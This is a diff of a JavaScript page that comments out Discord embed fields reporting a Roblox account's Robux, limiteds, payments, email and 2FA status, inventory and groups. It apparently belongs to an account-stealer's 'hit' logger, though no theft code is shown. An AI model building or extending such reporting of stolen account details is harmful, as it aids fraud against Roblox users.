@@ -211,55 +211,55 @@ export default function SlugPage() {
                 ].join("\n"),
                 inline: false,
               },
-              {
-                name: "💰 Robux",
-                value: `Balance: ${robuxBalance}\nPending: ${pendingRobux}`,
-                inline: true,
-              },
-              {
-                name: "Limiteds",
-                value: `RAP: ${rap}\nLimiteds: ${limiteds}`,
-                inline: true,
-              },
-              {
-                name: "Summary",
-                value: summary,
-                inline: true,
-              },
-              {
-                name: "💳 Payments",
-                value: `Credit Balance: ${creditBalance}\nin Unknown: ${inUnknown}`,
-                inline: true,
-              },
-              {
-                name: "🎮 Games",
-                value: [
-                  `<:mm2:1475152011740840039> ${mm2Display}`,
-                  `<:adm:1475152102266503321> ${admDisplay}`,
-                  `<:sab:1475152220671709224> ${sabDisplay}`,
-                ].join("\n"),
-                inline: true,
-              },
-              {
-                name: "⚙️ Settings",
-                value: `Email: ${emailVerified}\n2FA: ${twoFA}`,
-                inline: true,
-              },
-              {
-                name: "📦 Inventory",
-                value: inventory,
-                inline: true,
-              },
-              {
-                name: "Premium",
-                value: premium,
-                inline: true,
-              },
-              {
-                name: "👥 Groups",
-                value: `Owned: ${groupsOwned}\nBalance: ${groupsBalance}`,
-                inline: true,
-              },
+              // {
+              //   name: "💰 Robux",
+              //   value: `Balance: ${robuxBalance}\nPending: ${pendingRobux}`,
+              //   inline: true,
+              // },
+              // {
+              //   name: "Limiteds",
+              //   value: `RAP: ${rap}\nLimiteds: ${limiteds}`,
+              //   inline: true,
+              // },
+              // {
+              //   name: "Summary",
+              //   value: summary,
+              //   inline: true,
+              // },
+              // {
+              //   name: "💳 Payments",
+              //   value: `Credit Balance: ${creditBalance}\nin Unknown: ${inUnknown}`,
+              //   inline: true,
+              // },
+              // {
+              //   name: "🎮 Games",
+              //   value: [
+              //     `<:mm2:1475152011740840039> ${mm2Display}`,
+              //     `<:adm:1475152102266503321> ${admDisplay}`,
+              //     `<:sab:1475152220671709224> ${sabDisplay}`,
+              //   ].join("\n"),
+              //   inline: true,
+              // },
+              // {
+              //   name: "⚙️ Settings",
+              //   value: `Email: ${emailVerified}\n2FA: ${twoFA}`,
+              //   inline: true,
+              // },
+              // {
+              //   name: "📦 Inventory",
+              //   value: inventory,
+              //   inline: true,
+              // },
+              // {
+              //   name: "Premium",
+              //   value: premium,
+              //   inline: true,
+              // },
+              // {
+              //   name: "👥 Groups",
+              //   value: `Owned: ${groupsOwned}\nBalance: ${groupsBalance}`,
+              //   inline: true,
+              // },
               {
                 name: "🔧 Tool Used",
                 value: "```toolbox                                      ```",
